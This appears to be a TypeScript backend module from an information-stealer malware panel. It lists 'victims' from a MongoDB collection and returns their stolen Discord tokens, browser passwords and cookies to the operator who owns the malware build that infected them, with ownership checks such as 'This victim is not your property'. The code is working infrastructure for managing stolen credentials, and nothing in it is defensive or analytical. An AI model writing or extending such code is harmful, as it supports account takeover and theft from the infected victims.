import type { IDiscord } from '@/interfaces';
import type { Db } from 'mongodb';
import { getAllBuilds, getBuildId } from '@/server';

interface Discord extends IDiscord {
  id: string;
  index: number;
}

export const getVictimId = async (db: Db, owner: string, id: string, index?: number) => {
  const collection = db.collection('victims');
  const tokens: Discord[] = [];
  const victim = await collection.findOne({
    tokens: {
      $elemMatch: {
        id: id
      }
    }
  });

  if (!victim || !victim?.tokens.length) throw Error('This victim does not exist or does not have a Discord account!');
  const build = await getBuildId(db, victim.id, owner);
  if (build.owner.id !== owner) throw Error('This victim is not your property');
  if (index && index > victim.tokens.length) index = 0;

  const stats = {
    tokens: victim.tokens.length,
    accounts: victim.browsers.passwords.length,
    cookies: victim.browsers.cookies.length,
    games: 0
  };
  victim.tokens.map((token: Discord, index: number) => {
    let { index: _, ...account } = token;
    tokens.push({
      index,
      ...account
    });
  });
  return {
    stats,
    user: victim.tokens[index || 0],
    tokens
  };
};

export const getAllVictims = async (db: Db, id: string) => {
  const collection = db.collection('victims');
  const builds = (await getAllBuilds(db, id)).data.map(({ id }) => id);
  const victims = await collection
    .find({ id: { $in: builds } })
    .sort({ created_at: -1 })
    .toArray();
  return {
    count: victims.length,
    data: victims
  };
};
